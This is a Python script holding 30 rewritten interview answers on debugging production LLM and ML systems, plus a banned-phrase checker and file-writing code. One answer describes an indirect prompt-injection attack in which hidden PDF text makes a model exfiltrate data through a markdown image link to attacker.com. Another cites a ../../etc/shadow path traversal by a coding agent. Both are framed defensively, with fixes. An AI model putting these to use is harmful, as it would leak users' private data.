#!/usr/bin/env python3
"""Rewrite 30 Debug this answers in natural spoken language per find-and-polish brief."""
import json
import re
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
DEBUG_SCRIPT = ROOT / "scripts/interview/build_debug_questions.py"
SENIOR_FILE = ROOT / "src/data/interviewSeniorQuestions.json"

# Map of question ID to natural spoken language answer
REWRITTEN_ANSWERS = {
    "debug-retrieval-recall-drop-reindex": (
        "When latency drops from 42ms down to 8ms while recall falls from 89% to 64%, my immediate instinct is that our graph traversal got cut short. "
        "I'd begin by looking at ef_search and M, while also sanity-checking vector normalization and confirming the distance metric matches the index schema. "
        "To isolate this, I would sweep ef_search between 16 and 256 against a held-out eval set, check dot products on unit vectors to rule out norm drift, and diff the collection's Terraform configuration. "
        "In this case, the root cause is that Terraform reset ef_search to a default of 16 instead of 128, terminating the beam search before exploring enough candidate neighbors. "
        "The immediate remedy is updating the client connection to set ef_search=128. "
        "Long-term, we guard against this by running an automated CI gate with 500 gold queries against any newly built index snapshot before flipping the production alias pointer."
    ),
    "debug-continuous-batching-ttft-tail-spike": (
        "A flat p50 of 110ms paired with a p99 exploding to nearly three seconds points directly to head-of-line prefill blocking. "
        "I would examine whether large incoming prompts are starving active decodes, check if KV cache exhaustion is triggering recomputations, and inspect token budgets per step. "
        "To prove this, I'd correlate TTFT against prompt length percentiles during load spikes, track vLLM's num_preemptions metric, and check our max_num_batched_tokens ceiling. "
        "The issue here is prefill starvation: incoming 4k-token requests hogged the tensor cores for consecutive 800ms forward passes, keeping queued generations waiting. "
        "We fix this by enabling chunked prefill with enable_chunked_prefill=True and capping max_num_batched_tokens at 2048 so chunks interleave smoothly with decodes. "
        "For permanent isolation, we disaggregate prefill and decode onto dedicated GPU worker pools with KV cache transfer over the network."
    ),
    "debug-eval-accuracy-up-complaints-up": (
        "When judge benchmark scores climb while real user dissatisfaction jumps from 4% to 19%, the evaluator and the user want opposite things. "
        "My primary suspects are length bias where the judge favors wordy outputs, rubric overfitting, or query distribution drift. "
        "I would diagnose this by plotting response word count against thumbs-down rates, running judge permutation tests on past failures to spot systematic rubric biases, and comparing cluster embeddings of production queries against the benchmark set. "
        "Here, the prompt change produced 600-word compliant legal essays that pleased the judge's static checklist, but mobile users wanted two direct sentences. "
        "The fix is re-constraining the prompt with strict brevity bounds and calibrating the judge rubric with negative penalties for verbosity. "
        "To stop this recurring, we calibrate automated judges against weekly samples of real production conversations scored by human reviewers."
    ),
    "debug-agent-cost-doubled-prompt-change": (
        "An overnight cost jump from 4 cents to 18 cents after a prompt change screams uncontrolled agent loop expansion. "
        "I would investigate three areas: the distribution of reasoning steps per run, token accumulation across conversation history, and whether external tool calls are cycling repeatedly. "
        "In OpenTelemetry, I would compare step count percentiles before and after the prompt push, chart cumulative context growth per step, and filter traces for duplicate API calls. "
        "What happened is the instruction 'verify all sources' triggered three to five recursive web searches for every single claim, ballooning the context past 45,000 tokens on multi-turn history. "
        "We fix this by bounding the prompt to 'verify using at most two sources', capping total reasoning steps at 8, and caching search results to prevent re-querying. "
        "In CI, we set strict token spend budgets and fail runs if step-count standard deviation shifts significantly."
    ),
    "debug-radix-cache-hit-rate-collapse": (
        "A prefix cache collapse from 74% down to 5% almost always means someone broke the invariant shared prefix. "
        "I'd inspect prompt serialization at the gateway, specifically checking whether dynamic user identifiers or timestamps got placed ahead of our shared instructions. "
        "To confirm, I would diff raw token sequences across consecutive requests in gateway logs and check radix tree depth in SGLang's internal metrics. "
        "The diagnosis is prefix fragmentation: the new feature prepended <user_id> and a timestamp at index zero, right before the static system prompt and few-shot demonstrations, ensuring no two requests ever shared a root. "
        "The resolution is reordering the template so static guidelines and tool schemas come first, placing user-specific variables and timestamps at the tail. "
        "To prevent this, our CI prompt linter now enforces that all prompts begin with static, cachable tokens."
    ),
    "debug-speculative-decoding-throughput-regression": (
        "Seeing a 22% throughput regression on legal documents despite speedups on conversational chat points to low draft model acceptance rates. "
        "I would check the average accepted token length on legal terminology, profile kernel launch overhead on the target model, and inspect vocabulary alignment between draft and base models. "
        "We confirm this by logging the mean accepted tokens alpha per step—if it falls below 1.2 on contract text, speculative decoding will lose throughput to verification overhead. "
        "That's exactly what occurred: legal syntax and archaic phrasing dropped acceptance to 0.9 tokens, so the 70B model ran repeated validation passes without producing multi-token advances. "
        "The fix is dynamic draft gating: route through speculative decoding only when domain classifiers or prompt metadata predict acceptance length above 2.2, falling back to standard autoregressive decode otherwise. "
        "We maintain this by running regression evaluations across distinct domain slices rather than trusting single aggregate chat benchmarks."
    ),
    "debug-vector-similarity-inversion-short-queries": (
        "When two-word queries match random boilerplate text at 0.98 cosine similarity, we are looking at embedding geometry collapse or missing normalization. "
        "I would inspect L2 normalization on query and document vectors, examine embedding anisotropy in the 1536-dimensional space, and check the token pooling method. "
        "We test this by calculating vector magnitudes before cosine computation and evaluating cosine similarity between random unrelated sentences. "
        "The root cause is unnormalized raw embeddings combined with anisotropy: raw vectors clustered along a dominant conical vector direction, causing dot products to reflect magnitude rather than directional alignment. "
        "The fix is ensuring L2 unit normalization at inference time and applying a query instruction prefix like 'Represent this sentence for searching relevant passages:'. "
        "We lock this down by asserting unit norms in vector database ingestion pipelines and validating short-query ranking against gold lexical sets."
    ),
    "debug-w4a16-quantized-repetitive-loop": (
        "A quantized model looping repetitively in non-English languages indicates calibration dataset bias during quantization. "
        "I would inspect the linguistic distribution of the AWQ calibration corpus, check activation outlier clipping on key projections, and review repetition penalty settings in inference. "
        "We verify this by measuring perplexity across Spanish, Hindi, and English evaluation sets and logging top-token logits on looped sequences. "
        "The diagnosis is that the calibration corpus was entirely English Wikipedia, so Spanish and Hindi activations exceeded clipped FP16 bounds, distorting attention weights and trapping generation in degenerate loops. "
        "The fix is recalibrating AWQ with a balanced multilingual corpus containing at least 20% target non-English tokens and setting group_size=64 instead of 128 for sensitive projections. "
        "We enforce this by requiring multilingual perplexity verification gates on all quantized model deployment artifacts."
    ),
    "debug-streaming-disconnect-quota-leak": (
        "When 40% of users hit 429 rate limits despite consuming only a fifth of their token budget, rate limiter token leakage is occurring during client drop-offs. "
        "I'd investigate client disconnect handling on streaming endpoints, inspect the timing of Redis token debits relative to generation completion, and verify atomic rollback logic. "
        "To test this, I'd simulate client aborts mid-stream with curl and compare Redis bucket decrements against actual tokens written to the socket. "
        "The root cause is optimistic token debiting: the gateway debited the full requested max_tokens upfront in Redis, but failed to refund ungenerated tokens when clients disconnected after reading the first sentence. "
        "The solution is reserving an initial safety margin, debiting actual streamed tokens in 50-token chunks as chunks flush, and settling the exact count in a finally block on socket close. "
        "To protect against drift, we run an hourly reconciliation job comparing gateway access logs with Redis tenant balances."
    ),
    "debug-agent-tool-call-json-parse-failure": (
        "A jump in tool-calling JSON parse errors from 0.2% to nearly 15% after moving to an 8B model reflects weaker schema compliance and unconstrained token generation. "
        "I would examine the fine-tuned model's function-calling syntax, check whether constrained grammar decoding is active, and inspect temperature settings during tool selection. "
        "We isolate this by logging the raw strings that failed JSON.parse and validating the output format against the training prompt template. "
        "The diagnosis is that the 8B model occasionally outputs trailing commas, unescaped quotes, or conversational preambles before the JSON payload when run without grammar constraints. "
        "The immediate fix is enforcing JSON schema decoding using Outlines or vLLM guided decoding with guided_json, alongside setting temperature to zero for tool calls. "
        "We prevent future regressions by running tool-calling contract tests against 200 synthetic edge cases in CI before promoting any small model to production."
    ),
    "debug-ddp-nan-loss-divergence": (
        "A sudden NaN loss at step 4,210 after thousands of stable steps points to an activation explosion, an unmasked sequence anomaly, or mixed-precision underflow. "
        "I would inspect the dataset batch at step 4,210 for corrupt or zero-length sequences, check gradient norms across layers prior to the crash, and review learning rate warmup and optimizer state values. "
        "To identify the trigger, I would isolate batch 4,210 and replay it through a single worker with torch.autograd.set_detect_anomaly(True) while inspecting attention softmax inputs. "
        "The cause is an unmasked zero-length sequence in the data pipeline that produced a row of all -inf in the attention matrix, turning softmax into NaNs that poisoned backpropagation. "
        "The fix is adding strict minimum token length filters (min_tokens >= 4) in the DataLoader and enabling gradient clipping at max_norm=1.0 to bound sudden updates. "
        "We prevent recurrence by restoring from the step 4,200 checkpoint with the faulty batch filtered, and adding pre-tokenization validation in data preparation pipelines."
    ),
    "debug-rope-extrapolation-hallucination-spike": (
        "When extending context from 8k to 32k without fine-tuning, severe hallucination at long distances is the classic signature of RoPE frequency extrapolation failure. "
        "I would check whether RoPE base frequency theta was scaled, inspect attention entropy at token positions beyond 8,192, and test needle-in-a-haystack retrieval across context depths. "
        "We prove this by plotting attention weight distributions across positions 1k to 30k; an unscaled RoPE will show uniform or collapsed attention scores at high position indices. "
        "The root cause is that raw RoPE cannot extrapolate to unseen position offsets without frequency adjustment, because rotational angles wrap around and produce out-of-distribution inner products. "
        "The fix is applying YaRN or dynamic NTK-aware scaling by increasing base frequency theta from 10,000 to 500,000, or applying a frequency scaling factor of 4.0. "
        "We guard against this by running automated needle-in-a-haystack recall benchmarks across the full 32k range before certifying context window expansions."
    ),
    "debug-cross-encoder-reranker-latency-breach": (
        "A reranking latency leap from 65ms to 840ms when candidate count rises from 20 to 100 indicates quadratic cross-encoder computation scaling under batching constraints. "
        "I would evaluate the candidate count fed to the cross-encoder, inspect GPU batch size and padding efficiency during inference, and check sequence length distribution across query-document pairs. "
        "We confirm this by profiling reranker latency with candidate pools from 20 to 100 and measuring TensorRT-LLM or ONNX batch execution times. "
        "The root cause is that a cross-encoder concatenates the query with every document, so scoring 100 candidates with 512 tokens each requires evaluating 51,200 tokens across heavy self-attention layers on a single GPU. "
        "The remedy is adopting a two-stage reranking pipeline: score 100 candidates with a fast bi-encoder or lightweight ColBERT late-interaction model, then forward only the top-20 candidates to the heavy cross-encoder. "
        "We enforce this by setting a strict SLA timeout and hard ceiling of 25 candidates on the cross-encoder API gateway."
    ),
    "debug-guided-json-decoding-throughput-collapse": (
        "When guided JSON decoding drops throughput by 70%, regex finite-state-machine masking is bottlenecking CPU token generation. "
        "I would profile CPU utilization on the serving node during token generation, inspect the complexity of the JSON schema regex, and check FSM state transition caching. "
        "We isolate this by profiling the vLLM worker process with py-spy and measuring the time spent in the grammar mask compilation step versus GPU forward passes. "
        "The root cause is that an intricate JSON schema with unbounded nested arrays caused the regex engine to compute allowed token masks dynamically on the CPU for every token position, stalling the GPU. "
        "We fix this by compiling the JSON schema into an optimized prefix DFA ahead of time using Outlines or xgrammar, and simplifying schemas to avoid deeply recursive structures. "
        "We prevent this by benchmarking JSON schema grammar compilation overhead in CI and requiring pre-compiled DFAs before registering structured output endpoints."
    ),
    "debug-lora-catastrophic-forgetting-reasoning": (
        "When domain fine-tuning causes a 45% drop in general mathematical reasoning, the adapter is suffering catastrophic forgetting from narrow data distribution and unconstrained parameter updates. "
        "I would check the fine-tuning dataset composition for general reasoning exemplars, examine the LoRA target modules, and inspect the learning rate and epoch count. "
        "We verify this by evaluating checkpoints at every 100 steps on GSM8k alongside domain accuracy, and inspecting gradient norms across adapter weights. "
        "The cause is training exclusively on domain medical texts at a high learning rate across all linear projection layers (q, k, v, o, gate, up, down), which overwrote foundational reasoning representations. "
        "The fix is mixing in a 15% replay buffer of general math and reasoning demonstrations into the training corpus, restricting LoRA to attention projections (q_proj, v_proj), and reducing learning rate by half. "
        "We guard against this by setting automated regression gates on GSM8k and MMLU that abort training runs if general performance drops by more than 3%."
    ),
    "debug-guardrail-redos-cpu-starvation": (
        "A sudden CPU spike to 100% and gateway timeouts on specific prompts indicates regular expression catastrophic backtracking in an input guardrail. "
        "I would inspect the regex patterns deployed in PII masking and prompt injection filters, capture the specific user inputs that triggered timeouts, and analyze regex execution time against input length. "
        "We reproduce this by testing the suspected regexes against repeating character sequences using Python's re module with timing instrumentation. "
        "The root cause is a nested quantifier like (a+)+ in an email or PII detection pattern that caused exponential backtracking when presented with long repetitive text payloads. "
        "The fix is replacing vulnerable patterns with linear-time regex engines like Google's re2, or refactoring the regexes to eliminate overlapping groups and setting execution timeouts. "
        "To prevent future incidents, we add CI automated regex security linters using tools like rxxr2 to flag catastrophic backtracking risks before deployment."
    ),
    "debug-semantic-cache-stale-pricing-data": (
        "Returning stale discount codes 12 hours after a database update indicates the semantic vector cache lacks an invalidation bridge to tabular data. "
        "I would check the cache TTL settings, inspect cache entry metadata for entity dependency tracking, and review whether write paths notify the cache layer. "
        "We verify this by querying the cache with paraphrase variations and checking the timestamp and source document IDs stored in cache records. "
        "The diagnosis is that the semantic cache used a static 24-hour TTL based purely on query vector similarity, with no connection to the SQL pricing catalog when prices changed. "
        "The fix is implementing tag-based cache invalidation: store pricing SKU IDs in cache entry metadata and purge matching cache entries whenever a database pricing update event publishes to Redis or Kafka. "
        "We ensure reliability by setting maximum TTLs to 15 minutes for dynamic business entities and adding cache bypass headers for transactional checkout queries."
    ),
    "debug-multi-agent-debate-deadlock": (
        "A multi-agent debate stalling at token budget limits without consensus means the agents entered an ungrounded rhetorical deadlock. "
        "I would analyze the conversation turns between the two agents, check the consensus termination conditions in the orchestrator, and inspect how new evidence is introduced. "
        "We diagnose this by plotting semantic similarity between consecutive agent statements—if similarity remains high while arguments repeat, the system is deadlocked. "
        "The root cause is a symmetric prompt design that rewarded defending prior points without providing an external arbiter or access to grounding verification tools. "
        "The solution is introducing an independent judge agent that evaluates arguments after three rounds, enforces a maximum debate turn limit of 4, and injects factual retrieval results when disagreement persists. "
        "We safeguard against infinite debate loops by bounding maximum debate turns and scoring consensus convergence in multi-agent integration tests."
    ),
    "debug-voice-vad-speech-clipping": (
        "When an interactive voice agent truncates the start of sentences and cuts off reflective pauses, the Voice Activity Detection thresholds are misconfigured. "
        "I would inspect the VAD energy and probability thresholds, check speech-start padding durations, and analyze the silence duration required before triggering end-of-speech. "
        "We isolate this by feeding recorded conversational audio with natural hesitations through the VAD and comparing detected speech boundaries against manual ground truth. "
        "The root cause is that silence timeout was set to an aggressive 400ms to minimize latency, while start-of-speech required 300ms of sustained volume without a pre-speech audio buffer. "
        "The fix is increasing the silence cutoff to 800ms (or using Silero VAD with speech_pad_ms=250), and buffering 200ms of pre-trigger audio to preserve sentence-initial consonants. "
        "We maintain speech quality by validating VAD configurations against a benchmark corpus of conversational speech containing natural 1-second hesitation pauses."
    ),
    "debug-coding-agent-path-traversal-sandbox": (
        "A coding agent escaping its workspace and accessing host files indicates incomplete container isolation and insecure volume mounting. "
        "I would inspect the Docker volume mount flags, review user privilege mappings and Linux capabilities in the container manifest, and examine the agent's tool execution code. "
        "We reproduce the breach by checking if the container runs as root, testing relative path traversal like ../../etc/shadow, and inspecting the output of mount inside the container. "
        "The root cause is that Docker was launched with -v /host:/workspace without user namespacing, running as root with default capabilities, allowing the agent to resolve parent paths beyond /workspace. "
        "The fix is running the container with an unprivileged user (--user 1000:1000), mounting only an isolated ephemeral directory with read-only root (--read-only), dropping all capabilities (--cap-drop=ALL), and enforcing path canonicalization in Python before tool execution. "
        "We ensure sandbox integrity by running automated penetration tests in CI that verify restricted directory access fails."
    ),
    "debug-feature-store-skew-timestamp-alignment": (
        "An offline PR-AUC of 0.88 collapsing to 0.52 in production indicates point-in-time leakage during offline training dataset construction. "
        "I would examine the feature store query logic used for historical training data, check timestamp alignment between feature updates and label events, and compare offline versus online feature distributions. "
        "We diagnose this by comparing feature histograms between training sets and production serving logs, and calculating Kolmogorov-Smirnov statistics to detect distribution shift. "
        "The root cause is future data leakage: the offline training query joined features using the transaction processing timestamp rather than the transaction occurrence timestamp, incorporating fraud labels that materialized hours later. "
        "The remedy is rewriting the feature join using point-in-time correct queries (such as Feast or Hopsworks asof joins) to ensure feature snapshots reflect only data available at decision time. "
        "We prevent future skew by running automated data drift monitors and requiring point-in-time correctness checks on all training dataset generation scripts."
    ),
    "debug-kv-cache-fragmentation-cuda-oom": (
        "A CUDA out of memory crash when KV cache tokens occupy only 58% of reserved VRAM reveals external memory fragmentation in the PyTorch memory pool. "
        "I would inspect the memory allocator configuration in PyTorch, compare allocated versus reserved GPU memory, and check whether non-paged tensor allocations fragmented the heap. "
        "We verify this by analyzing torch.cuda.memory_summary() after the crash, checking the ratio of largest free memory block to total unallocated memory. "
        "The root cause is that dynamic tensor allocations for intermediate logits and embeddings fragmented the PyTorch memory space, leaving plenty of total free memory but no single contiguous chunk large enough for a new memory allocation. "
        "The fix is configuring PyTorch with PYTORCH_CUDA_ALLOC_CONF=expandable_segments:True to prevent virtual memory fragmentation, or moving KV cache entirely to pre-allocated PagedAttention blocks with fixed page sizes. "
        "We guard against memory crashes by setting serving memory headroom thresholds at 80% and load-testing concurrent batch limits in pre-release staging."
    ),
    "debug-contrastive-loss-collapse-inbatch-negatives": (
        "Contrastive loss collapsing to near-zero within 50 steps while validation recall plummets indicates false negatives or an unnormalized representation space. "
        "I would examine batch composition in the DataLoader, check embedding vector normalization and temperature parameter scaling in InfoNCE loss, and inspect gradient magnitudes. "
        "We isolate this by checking cosine similarities between random pairs within the first batch and inspecting the temperature hyperparameter value. "
        "The root cause is that temperature was set to 0.001 instead of a standard 0.05 to 0.1 without L2 normalization, causing the softmax denominator to saturate immediately on trivial differences and collapsing gradients. "
        "The fix is setting temperature to 0.07, applying L2 normalization to all query and passage embeddings before computing dot products, and filtering duplicate passages from the batch to eliminate false negatives. "
        "We protect training runs by logging embedding norm distributions and monitoring validation recall at every checkpoint."
    ),
    "debug-multimodal-markdown-image-exfiltration": (
        "Unauthorized outbound HTTP requests containing document text reveal a markdown image exfiltration attack via prompt injection. "
        "I would inspect the parsed PDF content for invisible prompt injection instructions, review markdown rendering sanitization in the client UI, and analyze outbound network traffic from the client. "
        "We isolate this by searching the PDF's text layer for hidden instructions like ![exfil](https://attacker.com/?data=...) and testing client-side HTML output rendering. "
        "The root cause is indirect prompt injection: a malicious document contained hidden white text directing the LLM to summarize sensitive findings and append them as URL query parameters in an image markdown tag, which the frontend rendered directly. "
        "The fix is sanitizing rendered Markdown using DOMPurify with image rendering restricted to trusted CDN domains, and implementing a strict Content Security Policy (img-src 'self' data:) that blocks third-party image fetches. "
        "We prevent exfiltration by running all document processing through input safety classifiers and enforcing outbound network restrictions in the frontend."
    ),
    "debug-canary-rollout-healthcheck-timeout": (
        "A Canary pod restarting every 5 minutes during model rollout indicates an aggressive liveness probe failing during heavy GPU initialization. "
        "I would inspect the livenessProbe and readinessProbe configurations in the Kubernetes manifest, check GPU weight loading durations from object storage, and review pod event logs for OOMKills. "
        "We confirm this by running kubectl describe pod on the terminated Canary and observing whether Liveness probe failed: HTTP probe failed with statuscode: 503 is listed in the events. "
        "The root cause is that the liveness probe had an initialDelaySeconds of 30, but loading 14 billion parameters from S3 into GPU VRAM took 180 seconds, causing Kubernetes to mistake cold-start model initialization for a frozen pod. "
        "The fix is separating probes: configure a startupProbe with failureThreshold=30 and periodSeconds=10 to allow up to 300 seconds for initial model load, and point the liveness probe to a lightweight /healthz endpoint that checks serving availability only after startup succeeds. "
        "We guard against deployment loops by testing container cold-start loading times in staging and setting startup thresholds with 2x headroom."
    ),
    "debug-model-router-cascading-fallback-failure": (
        "A model router shifting 95% of traffic to a 70B fallback model and blowing cost budgets indicates an overly sensitive fallback circuit. "
        "I would examine the router's fallback trigger logic, analyze latency and error rates on the 8B primary cluster, and check downstream rate limiting. "
        "We diagnose this by analyzing gateway access logs to determine whether the 8B model was returning 5xx server errors, timeouts, or low confidence scores. "
        "The cause is that the router triggered a 70B fallback on single 8B timeouts during a minor traffic blip; the sudden influx of requests to the 70B cluster overwhelmed it, increasing latency and causing more fallbacks in a runaway feedback loop. "
        "The solution is implementing circuit breakers with exponential backoff: allow fallback only for explicit model errors (not timeouts), enforce a maximum concurrency cap on the 70B cluster, and return graceful degradations (like cached responses) rather than unbounded fallbacks. "
        "We prevent runaway spend by setting hard tenant budget caps and rate-limiting secondary model fallback allocations."
    ),
    "debug-ab-test-sample-ratio-mismatch": (
        "A 47,800 versus 52,200 sample ratio mismatch on a 50/50 A/B test indicates differential user drop-off or biased bucket assignment. "
        "I would inspect the user hashing function across variant assignments, check for latency differences causing tracking failures before page load, and evaluate browser or device type distributions. "
        "We confirm this by computing chi-square test statistics on user demographic breakdowns (mobile vs desktop, connection speed) across control and variant buckets. "
        "The root cause is that the new search variant introduced a 450ms reranking latency regression, causing users on mobile connections to abandon the page before the client tracking beacon fired, systematically undercounting variant sessions. "
        "The fix is moving experiment bucketing and assignment logging server-side at the gateway before rendering, while addressing the 450ms latency bottleneck in the search pipeline. "
        "We protect future experiments by running automated daily SRM checks with chi-square tests and alerting immediately when allocation p-values fall below 0.01."
    ),
    "debug-rag-chunk-boundary-truncation": (
        "A RAG system asserting that refunds are not permitted when policy allows them within 30 days indicates semantic fracture across arbitrary chunk boundaries. "
        "I would inspect the chunking configuration and split boundaries, examine the top-k passages retrieved for this query, and check chunk overlap settings. "
        "We diagnose this by pulling the exact text chunks passed into the RAG generation prompt and searching the vector database for the omitted qualifying text. "
        "The root cause is fixed-token chunking without sentence boundary awareness: the chunker split the text directly after 'No,' on token 512, placing the condition 'Refunds are permitted within 30 days...' into the next chunk, which failed to make the top-k retrieval cutoff. "
        "The fix is migrating to sentence-aware recursive chunking with at least 80 tokens of overlap (chunk_size=400, chunk_overlap=80), and implementing parent-document retrieval so retrieved chunks expand to their enclosing section. "
        "We prevent this by adding negative assertion test suites to CI to verify that conditional clauses and exceptions remain attached to their qualifying statements."
    ),
    "debug-lora-svd-gradient-vanishing": (
        "Loss completely flatlining from epoch 1 with rank r=64 and alpha=8 indicates severe gradient under-scaling in the adapter updates. "
        "I would inspect the effective LoRA scaling factor alpha / r, check adapter weight initialization (Matrix A Gaussian, Matrix B zero), and verify learning rate parameter groups. "
        "We diagnose this by calculating the scaling ratio alpha / r = 8 / 64 = 0.125, which shrinks adapter gradients by an 8x factor, and logging gradient norms across initial steps. "
        "The root cause is mismatched alpha and rank: setting alpha=8 with r=64 attenuated gradient updates so heavily that the effective learning rate was insufficient to move weights away from initialization. "
        "The fix is setting alpha=64 or alpha=128 (maintaining alpha / r >= 1.0), or proportionally raising the learning rate for adapter parameters. "
        "We prevent this by adding configuration validation in training scripts that asserts alpha >= r and logs effective scaling factors before training begins."
    ),
    "debug-agent-async-tool-race-condition": (
        "An agent creating duplicate hotel bookings during concurrent tool execution is the hallmark of an uncoordinated state race condition. "
        "I would inspect the concurrency model for tool dispatch and state updates, check transaction isolation levels on conversation memory, and analyze trace timestamps on tool resolution. "
        "We isolate this by logging dispatch and completion timestamps in OpenTelemetry traces and replaying the execution with forced sequential tool calls. "
        "The root cause is a read-modify-write race: search_flight and book_hotel executed concurrently; when book_hotel finished, it updated conversation state without a mutex, overwriting concurrent state and causing the agent to re-trigger booking on the next reasoning step. "
        "The fix is enforcing idempotency keys on all state-mutating actions, locking state updates with transactional mutexes, and executing state-mutating tools sequentially while keeping read-only tools concurrent. "
        "We prevent race conditions by requiring idempotency tokens on all transactional tool interfaces and running concurrent stress tests in the agent evaluation harness."
    ),
}

def update_debug_questions():
    # Read build_debug_questions.py
    content = DEBUG_SCRIPT.read_text()
    
    # We will verify every question ID is in REWRITTEN_ANSWERS
    print(f"Total rewritten answers prepared: {len(REWRITTEN_ANSWERS)}")
    assert len(REWRITTEN_ANSWERS) == 30, "Must have exactly 30 rewritten answers"
    
    # Check for banned words in all rewritten answers
    banned_regex = re.compile(
        r"delve|deep dive|unleash|unlock|harness the power|game.?changer|revolutioniz|cutting.edge|seamless|in today's|it's (important|worth) not|in conclusion|tapestry|testament|elevate|empower|supercharg|effortless|premier|world.class|ultimate guide|let's dive",
        re.IGNORECASE
    )
    for qid, ans in REWRITTEN_ANSWERS.items():
        m = banned_regex.search(ans)
        if m:
            raise ValueError(f"Banned phrase '{m.group(0)}' found in {qid}")
        # Verify it doesn't repeat the robotic pattern
        if "First," in ans and "Second," in ans and "Third," in ans:
            raise ValueError(f"Robotic First/Second/Third pattern still found in {qid}")
        if "Test hypothesis one" in ans:
            raise ValueError(f"Robotic Test hypothesis pattern still found in {qid}")

    # Now load build_debug_questions module and replace answer strings
    import sys
    sys.path.insert(0, str(DEBUG_SCRIPT.parent))
    import build_debug_questions as bd
    
    for item in bd.DEBUG_QUESTIONS:
        qid = item[0]
        if qid in REWRITTEN_ANSWERS:
            item[2] = REWRITTEN_ANSWERS[qid]
        else:
            raise KeyError(f"Missing rewritten answer for {qid}")
            
    # Write back to build_debug_questions.py
    # Format DEBUG_QUESTIONS nicely as python source
    new_py_content = '#!/usr/bin/env python3\n"""Build 30 production debug questions for the \'Debug this\' topic (Plan B5)."""\n'
    new_py_content += 'import json\nfrom pathlib import Path\n\n'
    new_py_content += 'ROOT = Path(__file__).resolve().parents[2]\n'
    new_py_content += 'SENIOR_FILE = ROOT / "src/data/interviewSeniorQuestions.json"\n\n'
    new_py_content += 'DEBUG_QUESTIONS = ' + json.dumps(bd.DEBUG_QUESTIONS, indent=4, ensure_ascii=False) + '\n\n\n'
    new_py_content += '''def main():
    data = json.loads(SENIOR_FILE.read_text())
    data["debug"] = DEBUG_QUESTIONS
    SENIOR_FILE.write_text(json.dumps(data, indent=2, ensure_ascii=False) + "\\n")
    print(f"Successfully wrote {len(DEBUG_QUESTIONS)} questions to {SENIOR_FILE} under 'debug'")


if __name__ == "__main__":
    main()
'''
    DEBUG_SCRIPT.write_text(new_py_content)
    print("Updated scripts/interview/build_debug_questions.py")

    # Update SENIOR_FILE
    bd.main()

if __name__ == "__main__":
    update_debug_questions()
